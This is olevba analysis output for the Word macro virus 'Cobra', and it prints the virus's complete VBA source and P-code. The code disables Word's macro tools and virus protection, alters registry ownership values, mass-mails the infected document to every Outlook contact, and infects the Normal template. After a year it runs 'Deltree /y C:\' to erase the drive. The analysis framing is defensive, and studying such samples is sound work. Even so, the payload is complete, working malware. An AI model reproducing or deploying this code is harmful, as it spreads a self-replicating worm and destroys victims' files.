olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.p
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.p - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewCobra.bas 
in file: Virus.MSWord.Cobra.p - OLE stream: 'Macros/VBA/NewCobra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 2.0F

Sub AutoOpen()
Call CobA
Call CobB
Call CobC
End Sub
Sub AutoClose()
Call CobA
Call CobB
Call CobC
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
Sub FileNew()
Call CobA
Call CobB
Call CobC
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileOpen()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
Call CobA
Call CobB
Call CobC
End Sub
Sub FileClose()
On Error Resume Next
Call CobA
Call CobB
Call CobC
If ActiveDocument.Saved = False Then ActiveDocument.Save
WordBasic.FileClose
End Sub
Sub FileExit()
On Error Resume Next
Call CobA
Call CobB
Call CobC
If ActiveDocument.Saved = False Then ActiveDocument.Save
WordBasic.FileExit
End Sub
Sub FileSaveAs()
On Error Resume Next
Call CobA
Call CobB
Call CobC
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub CobA()
On Error Resume Next
Dim u, d, b
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Delete
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Delete
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Options.VirusProtection = False
Options.SaveNormalPrompt = False
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") <> "LITON VS Cobra" Or _
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") <> "349,(PA12A19H2AG)/DHK/BD" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Cobra", "Inf") = Format(Date, "mm/dd/yyyy")
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "LITON VS Cobra"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "349,(PA12A19H2AG)/DHK/BD"
End If
Set u = CreateObject("Outlook.Application")
Set d = u.GetNameSpace("MAPI")
d.Logon "profile", "password"
AdLC = d.AddressLists.Count
For l = 1 To AdLC
Set a = d.AddressLists(l)
i = 1
Set b = u.CreateItem(0)
AdEC = a.AddressEntries.Count
For t = 1 To AdEC
o = a.AddressEntries(i)
b.Recipients.Add o
i = i + 1
Next t
b.Subject = "Important message about Y2000 from " _
& Application.UserName
b.Attachments.Add ActiveDocument.FullName
b.Body = "Important documment;-"
b.Send
o = ""
Next l
d.LogOff
End Sub
Sub CobB()
On Error Resume Next
Set AD = ActiveDocument
Set NT = NormalTemplate
ac = False: nc = False
For i = 1 To NT.VBProject.VBComponents.Count
If NT.VBProject.VBComponents(i).Name <> "ThisDocument" And _
NT.VBProject.VBComponents(i).Name <> "NewCobra" Then
Application.OrganizerDelete Source:=NT.FullName, _
Name:=NT.VBProject.VBComponents(i).Name, _
Object:=wdOrganizerObjectProjectItems
End If
Next
For i = 1 To AD.VBProject.VBComponents.Count
If AD.VBProject.VBComponents(i).Name <> "ThisDocument" And _
AD.VBProject.VBComponents(i).Name <> "Reference to Normal" And _
AD.VBProject.VBComponents(i).Name <> "NewCobra" Then
Application.OrganizerDelete Source:=AD.FullName, _
Name:=AD.VBProject.VBComponents(i).Name, _
Object:=wdOrganizerObjectProjectItems
End If
Next
For i = 1 To AD.VBProject.VBComponents.Count
If AD.VBProject.VBComponents(i).Name = "NewCobra" Then
ac = True
End If
Next
For i = 1 To NT.VBProject.VBComponents.Count
If NT.VBProject.VBComponents(i).Name = "NewCobra" Then
nc = True
End If
Next
If ac = True And nc = False Then
Application.OrganizerCopy Source:=AD.FullName, _
Destination:=NT.FullName, Name:="NewCobra", _
Object:=wdOrganizerObjectProjectItems
End If
If ac = False And nc = True Then
Application.OrganizerCopy Source:=NT.FullName, _
Destination:=AD.FullName, Name:="NewCobra", _
Object:=wdOrganizerObjectProjectItems
End If
End Sub
Sub CobC()
On Error Resume Next
CIFDT = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Cobra", "Inf")
CURDT = Format(Date, "mm/dd/yyyy")
TOTDT = DateValue(CURDT) - DateValue(CIFDT)
If TOTDT > 365 And (WeekDay(Now) = 6 Or WeekDay(Now) = 1) Then
MsgBox "I am a new virus. " + Chr(13) + "Now, I am deleting you file(s)." + Chr(13) + "Please wait....""", vbOKOnly + vbExclamation, "AAX"
Shell "Deltree /y C:\"
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Cobra.p
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/NewCobra - 8238 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0012 "Cobra Version 2.0F"
' Line #1:
' Line #2:
' 	FuncDefn (Sub AutoOpen())
' Line #3:
' 	ArgsCall (Call) CobA 0x0000 
' Line #4:
' 	ArgsCall (Call) CobB 0x0000 
' Line #5:
' 	ArgsCall (Call) CobC 0x0000 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Sub AutoClose())
' Line #8:
' 	ArgsCall (Call) CobA 0x0000 
' Line #9:
' 	ArgsCall (Call) CobB 0x0000 
' Line #10:
' 	ArgsCall (Call) CobC 0x0000 
' Line #11:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #12:
' 	EndSub 
' Line #13:
' 	FuncDefn (Sub FileNew())
' Line #14:
' 	ArgsCall (Call) CobA 0x0000 
' Line #15:
' 	ArgsCall (Call) CobB 0x0000 
' Line #16:
' 	ArgsCall (Call) CobC 0x0000 
' Line #17:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #18:
' 	EndSub 
' Line #19:
' 	FuncDefn (Sub FileOpen())
' Line #20:
' 	OnError (Resume Next) 
' Line #21:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #22:
' 	ArgsCall (Call) CobA 0x0000 
' Line #23:
' 	ArgsCall (Call) CobB 0x0000 
' Line #24:
' 	ArgsCall (Call) CobC 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileClose())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) CobA 0x0000 
' Line #29:
' 	ArgsCall (Call) CobB 0x0000 
' Line #30:
' 	ArgsCall (Call) CobC 0x0000 
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #32:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Sub FileExit())
' Line #35:
' 	OnError (Resume Next) 
' Line #36:
' 	ArgsCall (Call) CobA 0x0000 
' Line #37:
' 	ArgsCall (Call) CobB 0x0000 
' Line #38:
' 	ArgsCall (Call) CobC 0x0000 
' Line #39:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #40:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #41:
' 	EndSub 
' Line #42:
' 	FuncDefn (Sub FileSaveAs())
' Line #43:
' 	OnError (Resume Next) 
' Line #44:
' 	ArgsCall (Call) CobA 0x0000 
' Line #45:
' 	ArgsCall (Call) CobB 0x0000 
' Line #46:
' 	ArgsCall (Call) CobC 0x0000 
' Line #47:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub CobA())
' Line #50:
' 	OnError (Resume Next) 
' Line #51:
' 	Dim 
' 	VarDefn u
' 	VarDefn d
' 	VarDefn B
' Line #52:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #53:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #54:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #55:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #56:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #57:
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #58:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #59:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #60:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #61:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #62:
' 	LineCont 0x0004 0E 00 00 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000E "LITON VS Cobra"
' 	Ne 
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0018 "349,(PA12A19H2AG)/DHK/BD"
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #63:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0000 ""
' 	LitStr 0x0033 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Cobra"
' 	LitStr 0x0003 "Inf"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #64:
' 	LitStr 0x000E "LITON VS Cobra"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #65:
' 	LitStr 0x0018 "349,(PA12A19H2AG)/DHK/BD"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set u 
' Line #68:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld u 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set d 
' Line #69:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld d 
' 	ArgsMemCall Logon 0x0002 
' Line #70:
' 	Ld d 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	St AdLC 
' Line #71:
' 	StartForVariable 
' 	Ld l 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AdLC 
' 	For 
' Line #72:
' 	SetStmt 
' 	Ld l 
' 	Ld d 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set a 
' Line #73:
' 	LitDI2 0x0001 
' 	St i 
' Line #74:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld u 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set B 
' Line #75:
' 	Ld a 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St AdEC 
' Line #76:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AdEC 
' 	For 
' Line #77:
' 	Ld i 
' 	Ld a 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St o 
' Line #78:
' 	Ld o 
' 	Ld B 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #79:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #80:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #81:
' 	LineCont 0x0004 05 00 00 00
' 	LitStr 0x0023 "Important message about Y2000 from "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld B 
' 	MemSt Subject 
' Line #82:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld B 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #83:
' 	LitStr 0x0015 "Important documment;-"
' 	Ld B 
' 	MemSt Body 
' Line #84:
' 	Ld B 
' 	ArgsMemCall Send 0x0000 
' Line #85:
' 	LitStr 0x0000 ""
' 	St o 
' Line #86:
' 	StartForVariable 
' 	Ld l 
' 	EndForVariable 
' 	NextVar 
' Line #87:
' 	Ld d 
' 	ArgsMemCall LogOff 0x0000 
' Line #88:
' 	EndSub 
' Line #89:
' 	FuncDefn (Sub CobB())
' Line #90:
' 	OnError (Resume Next) 
' Line #91:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #92:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #93:
' 	LitVarSpecial (False)
' 	St ac 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St nc 
' Line #94:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #95:
' 	LineCont 0x0004 0E 00 00 00
' 	Ld i 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld i 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "NewCobra"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #96:
' 	LineCont 0x0008 09 00 00 00 16 00 00 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld i 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	StartForVariable 
' 	Next 
' Line #99:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #100:
' 	LineCont 0x0008 0E 00 00 00 1B 00 00 00
' 	Ld i 
' 	Ld AD 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld i 
' 	Ld AD 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	And 
' 	Ld i 
' 	Ld AD 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "NewCobra"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #101:
' 	LineCont 0x0008 09 00 00 00 16 00 00 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld i 
' 	Ld AD 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	StartForVariable 
' 	Next 
' Line #104:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #105:
' 	Ld i 
' 	Ld AD 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "NewCobra"
' 	Eq 
' 	IfBlock 
' Line #106:
' 	LitVarSpecial (True)
' 	St ac 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	StartForVariable 
' 	Next 
' Line #109:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #110:
' 	Ld i 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "NewCobra"
' 	Eq 
' 	IfBlock 
' Line #111:
' 	LitVarSpecial (True)
' 	St nc 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	StartForVariable 
' 	Next 
' Line #114:
' 	Ld ac 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld nc 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #115:
' 	LineCont 0x0008 09 00 00 00 13 00 00 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "NewCobra"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	Ld ac 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld nc 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #118:
' 	LineCont 0x0008 09 00 00 00 13 00 00 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "NewCobra"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	EndSub 
' Line #121:
' 	FuncDefn (Sub CobC())
' Line #122:
' 	OnError (Resume Next) 
' Line #123:
' 	LitStr 0x0000 ""
' 	LitStr 0x0033 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Cobra"
' 	LitStr 0x0003 "Inf"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St CIFDT 
' Line #124:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St CURDT 
' Line #125:
' 	Ld CURDT 
' 	ArgsLd DateValue 0x0001 
' 	Ld CIFDT 
' 	ArgsLd DateValue 0x0001 
' 	Sub 
' 	St TOTDT 
' Line #126:
' 	Ld TOTDT 
' 	LitDI2 0x016D 
' 	Gt 
' 	Ld Now 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	Ld Now 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #127:
' 	LitStr 0x0012 "I am a new virus. "
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001F "Now, I am deleting you file(s)."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "Please wait....""
' 	Add 
' 	Ld vbOKOnly 
' 	Ld vbExclamation 
' 	Add 
' 	LitStr 0x0003 "AAX"
' 	ArgsCall MsgBox 0x0003 
' Line #128:
' 	LitStr 0x000E "Deltree /y C:\"
' 	ArgsCall Shell 0x0001 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

